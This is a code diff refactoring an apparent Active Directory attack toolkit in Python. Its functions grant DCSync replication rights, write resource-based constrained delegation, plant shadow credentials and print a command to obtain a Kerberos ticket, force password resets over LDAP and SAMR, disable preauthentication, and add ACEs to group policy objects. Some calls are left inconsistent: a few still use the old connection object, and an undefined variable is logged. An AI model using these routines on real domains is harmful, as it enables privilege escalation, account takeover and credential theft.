@@ -5,7 +5,7 @@ from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
 from dsinternals.system.DateTime import DateTime
 from dsinternals.common.data.hello.KeyCredential import KeyCredential
 
-from impacket.dcerpc.v5 import samr, transport
+from impacket.dcerpc.v5 import samr
 from impacket.ldap import ldaptypes
 
 import logging
@@ -23,18 +23,20 @@ def getGroupMembers(conn, identity):
     """
     Return the list of member for a group whose identity is given as parameter
     """
-    group_dn = resolvDN(conn, identity)
-    conn.search(group_dn, '(objectClass=group)', attributes='member')
-    LOG.info(conn.response[0]['attributes']['member'])
+    ldap_conn = conn.getLdapConnection()
+    group_dn = resolvDN(ldap_conn, identity)
+    ldap_conn.search(group_dn, '(objectClass=group)', attributes='member')
+    LOG.info(ldap_conn.response[0]['attributes']['member'])
 
 
 def getObjectAttributes(conn, identity):
     """
     Fetch LDAP attributes for the identity (group or user) provided
     """
-    dn = resolvDN(conn, identity)
-    conn.search(dn, '(objectClass=*)', attributes='*')
-    LOG.info(conn.response[0]['attributes'])
+    ldap_conn = conn.getLdapConnection()
+    dn = resolvDN(ldap_conn, identity)
+    ldap_conn.search(dn, '(objectClass=*)', attributes='*')
+    LOG.info(ldap_conn.response[0]['attributes'])
 
 
 def addUser(conn, sAMAccountName, ou=None):
@@ -43,6 +45,7 @@ def addUser(conn, sAMAccountName, ou=None):
     By default the user object is put in the OU Users
     This can be changed with the ou parameter
     """
+    ldap_conn = conn.getLdapConnection()
 
     # TODO: Check that the user is not already present in AD?
     #user_dn = resolvDN(conn, sAMAccountName)
@@ -51,7 +54,7 @@ def addUser(conn, sAMAccountName, ou=None):
     if ou:
         user_dn = f"cn={sAMAccountName},{ou}"
     else:
-        naming_context = getDefaultNamingContext(conn)
+        naming_context = getDefaultNamingContext(ldap_conn)
         user_dn = f"cn={sAMAccountName},cn=Users,{naming_context}"
 
     LOG.debug(user_dn)
@@ -65,17 +68,18 @@ def addUser(conn, sAMAccountName, ou=None):
     #password = "cravatterouge!"
     #encoded_password = base64.b64encode(password.encode("utf16-le"))
     #attr["unicodePwd"] = encoded_password
-    conn.add(user_dn, attributes=attr)
-    LOG.info(conn.result)
+    ldap_conn.add(user_dn, attributes=attr)
+    LOG.info(ldap_conn.result)
 
 
 def delObject(conn, identity):
     """
     Delete an object (user or group) from the Directory based on the identity provided
     """
-    dn = resolvDN(conn, identity)
+    ldap_conn = conn.getLdapConnection()
+    dn = resolvDN(ldap_conn, identity)
     LOG.debug(f"Trying to remove {dn}")
-    conn.delete(dn)
+    ldap_conn.delete(dn)
     LOG.info(f"[+] {dn} has been removed")
 
 
@@ -85,11 +89,12 @@ def addUserToGroup(conn, member, group):
         member: the user or group to add into the group
         group: the group to add to
     """
-    member_dn = resolvDN(conn, member)
+    ldap_conn = conn.getLdapConnection()
+    member_dn = resolvDN(ldap_conn, member)
     LOG.debug(f"[+] {member} found at {member_dn}")
-    group_dn = resolvDN(conn, group)
+    group_dn = resolvDN(ldap_conn, group)
     LOG.debug(f"[+] {group} found at {group_dn}")
-    addMembersToGroups.ad_add_members_to_groups(conn, member_dn, group_dn, raise_error=True)
+    addMembersToGroups.ad_add_members_to_groups(ldap_conn, member_dn, group_dn, raise_error=True)
     LOG.info(f"[+] Adding {member_dn} to {group_dn}")
 
 
@@ -97,8 +102,9 @@ def getUsersInOu(conn, base_ou):
     """
     List the user present in an organisational unit
     """
-    conn.search(base_ou, '(objectClass=user)')
-    for entry in conn.response:
+    ldap_conn = conn.getLdapConnection()
+    ldap_conn.search(base_ou, '(objectClass=user)')
+    for entry in ldap_conn.response:
         LOG.info(entry['dn'])
 
 
@@ -106,9 +112,10 @@ def delUserFromGroup(conn, member, group):
     """
     Remove member from group
     """
-    member_dn = resolvDN(conn, member)
-    group_dn = resolvDN(conn, group)
-    removeMembersFromGroups.ad_remove_members_from_groups(conn, member_dn, group_dn, True, raise_error=True)
+    ldap_conn = conn.getLdapConnection()
+    member_dn = resolvDN(ldap_conn, member)
+    group_dn = resolvDN(ldap_conn, group)
+    removeMembersFromGroups.ad_remove_members_from_groups(ldap_conn, member_dn, group_dn, True, raise_error=True)
 
 
 def addForeignObjectToGroup(conn, user_sid, group_dn):
@@ -118,9 +125,10 @@ def addForeignObjectToGroup(conn, user_sid, group_dn):
         foreign object sid
         group dn in which to add the foreign object
     """
+    ldap_conn = conn.getLdapConnection()
     # https://social.technet.microsoft.com/Forums/en-US/6b7217e1-a197-4e24-9357-351c2d23edfe/ldap-query-to-add-foreignsecurityprincipals-to-a-group?forum=winserverDS
     magic_user_dn = f"<SID={user_sid}>"
-    addMembersToGroups.ad_add_members_to_groups(conn, magic_user_dn, group_dn, raise_error=True)
+    addMembersToGroups.ad_add_members_to_groups(ldap_conn, magic_user_dn, group_dn, raise_error=True)
 
 
 def addDomainSync(conn, identity):
@@ -129,18 +137,19 @@ def addDomainSync(conn, identity):
     Args:
         sAMAccountName, DN, GUID or SID of the user
     """
-    user_dn = resolvDN(identity)
+    ldap_conn = conn.getLdapConnection()
+    user_dn = resolvDN(ldap_conn, identity)
     # Query for the sid of our target user
-    conn.search(user_dn, '(objectClass=*)', attributes=['objectSid'])
-    user_sid = conn.entries[0]['objectSid'].raw_values[0]
+    ldap_conn.search(user_dn, '(objectClass=*)', attributes=['objectSid'])
+    user_sid = ldap_conn.entries[0]['objectSid'].raw_values[0]
 
 
     # Set SD flags to only query for DACL
     controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)
 
     # print_m('Querying domain security descriptor')
-    conn.search(getDefaultNamingContext(conn), '(&(objectCategory=domain))', attributes=['nTSecurityDescriptor'], controls=controls)
-    entry = conn.entries[0]
+    ldap_conn.search(getDefaultNamingContext(ldap_conn), '(&(objectCategory=domain))', attributes=['nTSecurityDescriptor'], controls=controls)
+    entry = ldap_conn.entries[0]
 
     secDescData = entry['nTSecurityDescriptor'].raw_values[0]
 
@@ -155,7 +164,7 @@ def addDomainSync(conn, identity):
 
     dn = entry.entry_dn
     data = secDesc.getData()
-    conn.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
+    ldap_conn.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
 
 
 def changePassword(conn, identity, new_pass):
@@ -165,17 +174,17 @@ def changePassword(conn, identity, new_pass):
         sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
         new password for the target
     """
-    target_dn = resolvDN(conn, identity)
+    ldap_conn = conn.getLdapConnection()
+    target_dn = resolvDN(ldap_conn, identity)
 
-    modifyPassword.ad_modify_password(conn, target_dn, new_pass, old_password=None)
-    if conn.result['result'] == 0:
+    modifyPassword.ad_modify_password(ldap_conn, target_dn, new_pass, old_password=None)
+    if ldap_conn.result['result'] == 0:
         LOG.info('[+] Password changed successfully!')
     else:
-        raise ResultError(conn.result)
+        raise ResultError(ldap_conn.result)
 
 
-
-def rpcChangePassword(domain, username, password, hostname, target, new_pass):
+def rpcChangePassword(conn, target, new_pass):
     """
     Change the target password without knowing the old one using RPC instead of LDAPS
     Args: 
@@ -186,27 +195,9 @@ def rpcChangePassword(domain, username, password, hostname, target, new_pass):
         sAMAccountName of the target
         new password for the target
     """
-    rpctransport = transport.SMBTransport(hostname, filename=r'\samr')
-
-    # TODO: change this ugly shit
-    lmhash, nthash = None, None
-    try:
-        lmhash_maybe, nthash_maybe = password.split(':')
-        if 32 == len(lmhash_maybe) == len(nthash_maybe):
-            lmhash, nthash = lmhash_maybe, nthash_maybe
-            password = None
-    except:
-        pass
-
-    rpctransport.set_credentials(username, password, domain, lmhash=lmhash, nthash=nthash)
-    dce = rpctransport.get_dce_rpc()
-    from impacket.dcerpc.v5 import rpcrt
-    dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
-    dce.connect()
-    dce.bind(samr.MSRPC_UUID_SAMR)
-
-    server_handle = samr.hSamrConnect(dce, hostname + '\x00')['ServerHandle']
-    domainSID = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain)['DomainId']
+    dce = conn.getSamrConnection()
+    server_handle = samr.hSamrConnect(dce, conn.conf.host + '\x00')['ServerHandle']
+    domainSID = samr.hSamrLookupDomainInSamServer(dce, server_handle, conn.conf.domain)['DomainId']
     domain_handle = samr.hSamrOpenDomain(dce, server_handle, domainId=domainSID)['DomainHandle']   
     userRID = samr.hSamrLookupNamesInDomain(dce, domain_handle, (target,))['RelativeIds']['Element'][0]
     opened_user = samr.hSamrOpenUser(dce, domain_handle, userId=userRID)
@@ -222,9 +213,8 @@ def rpcChangePassword(domain, username, password, hostname, target, new_pass):
     resp = dce.request(req)
     resp.dump()
 
-# TODO: set Require Preauth
+
 # TODO: Add Computer
-# TODO: Write GPO DACL
 
 def setRbcd(conn, spn_sid, target_identity):
     """
@@ -233,17 +223,18 @@ def setRbcd(conn, spn_sid, target_identity):
         object sid of the SPN (Controlled by you)
         sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
     """
-    target_dn = resolvDN(conn, target_identity)
+    ldap_conn = conn.getLdapConnection()
+    target_dn = resolvDN(ldap_conn, target_identity)
 
-    entries = conn.search(getDefaultNamingContext(conn), '(sAMAccountName=%s)' % spn_sid, attributes=['objectSid'])
+    entries = conn.search(getDefaultNamingContext(ldap_conn), '(sAMAccountName=%s)' % spn_sid, attributes=['objectSid'])
     try:
-        spn_sid = conn.entries[0]['objectSid'].raw_values[0]
+        spn_sid = ldap_conn.entries[0]['objectSid'].raw_values[0]
     except IndexError:
         LOG.error('User not found in LDAP: %s' % spn_sid)
 
-    conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName','objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
+    ldap_conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName','objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
     targetuser = None
-    for entry in conn.response:
+    for entry in ldap_conn.response:
         if entry['type'] != 'searchResEntry':
             continue
         targetuser = entry
@@ -259,12 +250,12 @@ def setRbcd(conn, spn_sid, target_identity):
         # Create DACL manually
         sd = createEmptySD()
     sd['Dacl'].aces.append(createACE(spn_sid))
-    conn.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
-    if conn.result['result'] == 0:
+    ldap_conn.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
+    if ldap_conn.result['result'] == 0:
         LOG.info('Delegation rights modified succesfully!')
         LOG.info('%s can now impersonate users on %s via S4U2Proxy', ldaptypes.LDAP_SID(spn_sid).formatCanonical(), target)
     else:
-        raise ResultError(conn.result)
+        raise ResultError(ldap_conn.result)
 
 
 def setShadowCredentials(conn, sAMAccountName):
@@ -273,11 +264,13 @@ def setShadowCredentials(conn, sAMAccountName):
     Args: 
         sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
     """
+    ldap_conn = conn.getLdapConnection()
+
     ShadowCredentialsOutfilePath = None
     ShadowCredentialsExportType = 'PEM'
     ShadowCredentialsPFXPassword = None
 
-    target_dn = resolvDN(conn, sAMAccountName)
+    target_dn = resolvDN(ldap_conn, sAMAccountName)
     LOG.debug("Generating certificate")
     certificate = X509Certificate2(subject=sAMAccountName, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
     LOG.debug("Certificate generated")
@@ -285,9 +278,9 @@ def setShadowCredentials(conn, sAMAccountName):
     keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
     LOG.debug("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
     LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
-    conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['msDS-KeyCredentialLink'])
+    ldap_conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['msDS-KeyCredentialLink'])
     results = None
-    for entry in conn.response:
+    for entry in ldap_conn.response:
         if entry['type'] != 'searchResEntry':
             continue
         results = entry
@@ -299,7 +292,7 @@ def setShadowCredentials(conn, sAMAccountName):
         LOG.debug(new_values)
         LOG.debug("Updating the msDS-KeyCredentialLink attribute of %s" % sAMAccountName)
         conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
-        if conn.result['result'] == 0:
+        if ldap_conn.result['result'] == 0:
             LOG.debug("Updated the msDS-KeyCredentialLink attribute of the target object")
             if ShadowCredentialsOutfilePath is None:
                 path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
@@ -326,7 +319,7 @@ def setShadowCredentials(conn, sAMAccountName):
                 LOG.info("Run the following command to obtain a TGT")
                 LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, '<DOMAIN>', sAMAccountName, path))
         else:
-            raise ResultError(conn.result)
+            raise ResultError(ldap_conn.result)
     except IndexError:
         LOG.error('Attribute msDS-KeyCredentialLink does not exist')
     return
@@ -339,8 +332,10 @@ def dontReqPreauth(conn, identity, enable):
         sAMAccountName, DN, GUID or SID of the target
         set the flag on the UserAccountControl attribute (default is True)
     """
+    ldap_conn = conn.getLdapConnection()
+
     UF_DONT_REQUIRE_PREAUTH = 4194304
-    userAccountControl(conn, identity, enable, UF_DONT_REQUIRE_PREAUTH)
+    userAccountControl(ldap_conn, identity, enable, UF_DONT_REQUIRE_PREAUTH)
 
 
 
@@ -352,8 +347,10 @@ def accountdisable(conn, identity, enable):
         sAMAccountName, DN, GUID or SID of the target
         set the flag on the UserAccountControl attribute 
     """
+    ldap_conn = conn.getLdapConnection()
+
     UF_ACCOUNTDISABLE = 2
-    userAccountControl(conn, identity, enable, UF_ACCOUNTDISABLE)
+    userAccountControl(ldap_conn, identity, enable, UF_ACCOUNTDISABLE)
 
 def modifyGpoACE(conn, identity, gpo):
     """
@@ -362,16 +359,18 @@ def modifyGpoACE(conn, identity, gpo):
         sAMAccountName, DN, GUID or SID of the user
         name of the GPO (ldap name)
     """
-    user_dn = resolvDN(conn, identity)
-    conn.search(user_dn, '(objectClass=*)', attributes=['objectSid'])
-    user_sid = conn.entries[0]['objectSid'].raw_values[0]
+    ldap_conn = conn.getLdapConnection()
+
+    user_dn = resolvDN(ldap_conn, identity)
+    ldap_conn.search(user_dn, '(objectClass=*)', attributes=['objectSid'])
+    user_sid = ldap_conn.entries[0]['objectSid'].raw_values[0]
 
     controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)
-    conn.search(getDefaultNamingContext(conn), '(&(objectclass=groupPolicyContainer)(name=%s))' % gpo, attributes=['nTSecurityDescriptor'], controls=controls)
+    ldap_conn.search(getDefaultNamingContext(ldap_conn), '(&(objectclass=groupPolicyContainer)(name=%s))' % gpo, attributes=['nTSecurityDescriptor'], controls=controls)
 
-    if len(conn.entries) <= 0:
-        raise NoResultError(getDefaultNamingContext(conn), '(&(objectclass=groupPolicyContainer)(name=%s))' % gpo)
-    gpo = conn.entries[0]
+    if len(ldap_conn.entries) <= 0:
+        raise NoResultError(getDefaultNamingContext(ldap_conn), '(&(objectclass=groupPolicyContainer)(name=%s))' % gpo)
+    gpo = ldap_conn.entries[0]
 
     secDescData = gpo['nTSecurityDescriptor'].raw_values[0]
     secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
@@ -379,8 +378,8 @@ def modifyGpoACE(conn, identity, gpo):
     secDesc['Dacl']['Data'].append(newace)
     data = secDesc.getData()
 
-    conn.modify(gpo.entry_dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
-    if conn.result["result"] == 0:
+    ldap_conn.modify(gpo.entry_dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
+    if ldap_conn.result["result"] == 0:
         LOG.info('LDAP server claims to have taken the secdescriptor. Have fun')
     else:
-        raise ResultError(conn.result)
+        raise ResultError(ldap_conn.result)
